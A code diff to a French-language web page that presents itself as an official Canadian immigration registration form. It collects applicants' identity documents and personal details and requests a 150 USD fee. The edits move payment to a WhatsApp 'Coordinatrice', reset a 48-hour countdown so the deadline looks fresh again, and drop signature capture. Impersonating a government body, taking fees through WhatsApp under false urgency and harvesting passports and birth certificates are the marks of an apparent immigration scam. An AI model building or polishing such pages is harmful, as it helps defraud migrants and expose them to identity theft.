@@ -200,7 +200,7 @@ textarea:focus{border-color:#8B0000}
       <li>📄 Extrait de naissance</li>
       <li>🪪 Passeport ou Carte d'identité</li>
       <li>📋 CV</li>
-      <li>💳 Preuve de paiement (150 USD)</li>
+      <li>💬 Paiement (150 USD) — Contactez la Coordinatrice via WhatsApp</li>
     </ul>
   </div>
 
@@ -250,8 +250,8 @@ window.onload = function() {
   };
 
   // COMPTE A REBOURS
-  var dl = localStorage.getItem('cic_dl3');
-  if (!dl) { dl = Date.now() + 48*3600000; localStorage.setItem('cic_dl3', dl); }
+  var dl = localStorage.getItem('cic_dl5');
+  if (!dl) { dl = Date.now() + 48*3600000; localStorage.setItem('cic_dl5', dl); }
   var el = document.getElementById('cd');
   function tick(){
     var d = parseInt(dl) - Date.now();
@@ -261,15 +261,11 @@ window.onload = function() {
   }
   tick(); setInterval(tick,1000);
 
-  // ENVOI GMAIL
+  // ENVOI GMAIL — sans code base64
   document.getElementById('submit-btn').onclick = function(){
     var nom    = document.getElementById('nom').value.trim();
     var prenom = document.getElementById('prenom').value.trim();
     if (!nom||!prenom){ alert('Veuillez remplir le Nom et le Prénom.'); return; }
-
-    // Récupère le code base64 de la signature automatiquement
-    var sigCode = cv.toDataURL('image/png').split(',')[1];
-    var sigVide = sigCode.length < 200; // signature vide
 
     var corps =
       "FICHE D'INSCRIPTION OFFICIELLE DU CANADA\n\n" +
@@ -291,16 +287,12 @@ window.onload = function() {
       "Motivations : "+(document.getElementById('motiv').value.trim()||"—")+"\n\n" +
       "Nom signature : "+(document.getElementById('nom_prenom').value.trim()||nom+" "+prenom)+"\n\n" +
       "========================================\n" +
-      "SIGNATURE DU CANDIDAT (code base64) :\n" +
-      (sigVide ? "Aucune signature" : sigCode) + "\n" +
-      "Pour voir la signature : base64.guru/converter/decode/image\n" +
-      "========================================\n\n" +
-      "⚠️ RAPPEL : Joignez ces documents avant d'envoyer :\n" +
+      "⚠️ RAPPEL DOCUMENTS A JOINDRE :\n" +
       "- Photo d'identite\n" +
       "- Extrait de naissance\n" +
       "- Passeport ou Carte d'identite\n" +
       "- CV\n" +
-      "- Preuve de paiement (150 USD)\n" +
+      "- Paiement 150 USD : Contactez la Coordinatrice via WhatsApp\n" +
       "========================================";
 
     var sujet = "Dossier immigration - "+prenom+" "+nom;
